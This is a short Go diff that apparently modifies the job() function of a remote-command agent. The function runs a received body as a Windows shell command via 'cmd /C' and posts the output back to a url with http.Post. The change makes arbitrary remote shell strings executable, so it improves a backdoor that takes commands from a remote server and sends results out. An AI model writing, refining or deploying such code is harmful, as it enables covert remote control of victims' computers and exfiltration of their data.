@@ -48,7 +48,7 @@ func job() {
 
 	bstr := string(body)
 	if bstr != "" {
-		out, err := exec.Command(bstr).Output()
+		out, err := exec.Command("cmd", "/C", bstr).Output()
 		http.Post(url, "text/plain", strings.NewReader(string(out)))
 		fmt.Println(err)
 	}
